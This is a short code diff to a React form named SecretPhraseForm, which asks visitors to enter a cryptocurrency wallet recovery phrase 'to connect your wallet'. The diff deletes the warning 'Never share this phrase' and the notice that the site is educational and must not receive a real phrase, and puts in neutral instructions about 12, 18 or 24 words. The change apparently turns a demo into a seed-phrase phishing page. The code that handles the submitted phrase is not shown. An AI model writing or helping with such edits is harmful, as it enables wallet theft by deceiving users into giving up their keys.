@@ -437,8 +437,8 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
           </div>
         </div>
         <DialogDescription className="pt-2 text-left pl-11">
-          Enter your secret recovery phrase to connect your wallet.
-          <span className="font-bold"> Never share this phrase.</span>
+          Enter your recovery phrase to connect your wallet.
+          <span className="font-bold"> Typically 12 (sometimes 18, 24) words separated by single spaces.</span>
         </DialogDescription>
       </DialogHeader>
       <Form {...form}>
@@ -475,7 +475,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
           />
 
            <p className="text-xs text-muted-foreground">
-              This site is for educational purposes. Do not use your real secret phrase.
+             Typically 12 (sometimes 18, 24) words separated by single spaces.
             </p>
           <Button
             type="submit"
